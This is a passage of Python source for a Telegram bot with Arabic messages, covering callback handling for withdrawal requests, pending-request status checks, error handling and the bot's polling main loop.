            balance, _ = calculate_new_balance(user_id)
            
            if balance < MIN_WITHDRAWAL:
                bot.answer_callback_query(call.id, f"❌ الحد الأدنى للسحب هو {format_currency(MIN_WITHDRAWAL)} ليرة. رصيدك الحالي: {format_currency(balance)} ليرة.", show_alert=True)
                return
            
            reject_time_str = user_info.get('last_withdraw_reject_time')
            if reject_time_str:
                try:
                    last_reject_time = datetime.datetime.fromisoformat(reject_time_str)
                except ValueError:
                    last_reject_time = datetime.datetime.min 

                time_elapsed_since_reject = datetime.datetime.now() - last_reject_time
                
                if time_elapsed_since_reject.total_seconds() < WITHDRAW_REJECT_WAIT_HOURS * 3600:
                    remaining_seconds = (WITHDRAW_REJECT_WAIT_HOURS * 3600) - time_elapsed_since_reject.total_seconds()
                    remaining_days = int(remaining_seconds // (24 * 3600))
                    remaining_hours = int((remaining_seconds % (24 * 3600)) // 3600)
                    
                    bot.answer_callback_query(
                        call.id, 
                        f"🚫 عذراً، تم رفض طلب سحب سابق. يجب الانتظار 5 أيام (120 ساعة) لتقديم طلب جديد.\n\n"
                        f"تبقى: {remaining_days} يوم و {remaining_hours} ساعة.", 
                        show_alert=True
                    )
                    return
                else:
                    user_info['last_withdraw_reject_time'] = None
                    save_data(user_data)
            
            user_info['state'] = STATE_AWAITING_WITHDRAW_AMOUNT 
            save_data(user_data)
            
            withdraw_msg = (
                f"✅ رصيدك الحالي المؤهل للسحب هو: **{format_currency(balance)} ليرة**.\n\n"
                "**الرجاء إرسال المبلغ الذي ترغب بسحبه الآن (رقم فقط).**\n"
                f"*ملاحظة: الحد الأدنى للسحب هو: {format_currency(MIN_WITHDRAWAL)} ليرة.*"
            )
            
            # تعديل الرسالة الأصلية بدلاً من الرد
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=withdraw_msg,
                parse_mode='Markdown',
                reply_markup=None
            )


        # استعلام عن حالة الطلب
        elif data == 'check_pending':
            user_info = user_data.get(user_id)
            
            time_remaining_msg = "⏳ طلبك قيد المراجعة."
            
            # تحديد نوع الطلب ووقت تقديمه
            submission_time_str = user_info.get('deposit_submission_time') or user_info.get('withdrawal_submission_time')
            is_deposit = bool(user_info.get('deposit_submission_time'))
            
            if submission_time_str:
                try:
                    submission_time = datetime.datetime.fromisoformat(submission_time_str)
                except ValueError:
                    submission_time = datetime.datetime.now() 
                    
                time_elapsed = datetime.datetime.now() - submission_time
                max_wait = DEPOSIT_WAIT_HOURS if is_deposit else 48 # نفترض 48 ساعة للمراجعة النهائية بعد التأخير
                
                if time_elapsed.total_seconds() < max_wait * 3600:
                    remaining_seconds = (max_wait * 3600) - time_elapsed.total_seconds()
                    
                    remaining_days = int(remaining_seconds // (24 * 3600))
                    remaining_hours = int((remaining_seconds % (24 * 3600)) // 3600)
                    remaining_minutes = int((remaining_seconds % 3600) // 60)
                    
                    time_parts = []
                    if remaining_days > 0: time_parts.append(f"{remaining_days} يوم")
                    if remaining_hours > 0: time_parts.append(f"{remaining_hours} ساعة")
                    if remaining_minutes > 0: time_parts.append(f"{remaining_minutes} دقيقة")
                    
                    if not time_parts: time_parts.append("أقل من دقيقة")

                    action_type = "إيداعك" if is_deposit else "سحبك"
                    time_remaining_msg = f"⏳ طلب {action_type} قيد المراجعة. قد تستغرق المراجعة ما يصل إلى {max_wait} ساعة. تبقى: {' و '.join(time_parts)}."
                else:
                     time_remaining_msg = "✅ تجاوز طلبك فترة المراجعة المتوقعة. يُرجى انتظار الموافقة النهائية من المشرف."

            bot.answer_callback_query(call.id, time_remaining_msg, show_alert=True)
            
        else:
            bot.answer_callback_query(call.id, "معاملة غير معروفة أو غير صالحة.", show_alert=False)
            
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass 
        
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" not in str(e) and "message to edit not found" not in str(e):
            print(f"Error in callback_handler (API): {e}")
            bot.answer_callback_query(call.id, "⚠️ حدث خطأ ما في معالجة طلبك.", show_alert=True)
            
    except Exception as e:
        print(f"An UNEXPECTED error occurred in callback_query_handler for user {user_id} with data {data}: {e}")
        bot.answer_callback_query(call.id, "⚠️ حدث خطأ غير متوقع. يرجى إبلاغ المشرف.", show_alert=True)


# --- تشغيل البوت ---
if __name__ == '__main__':
    print("Bot is running...")
    user_data = load_data()
    setup_bot_commands() 
    
    # تشغيل دالة الفحص الدوري في مؤقت منفصل
    delay_checker_thread = threading.Thread(target=check_pending_withdrawals)
    delay_checker_thread.daemon = True # سيتم إيقاف المؤقت عند إيقاف البرنامج الرئيسي
    delay_checker_thread.start()
    
    print("Periodic check thread started.")
    
    while True:
        try:
            # بدء البولينج لاستقبال رسائل تيليجرام
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
            
        except Exception as e:
            print(f"Polling error: {e}. Retrying in 5 seconds...")
            time.sleep(5)
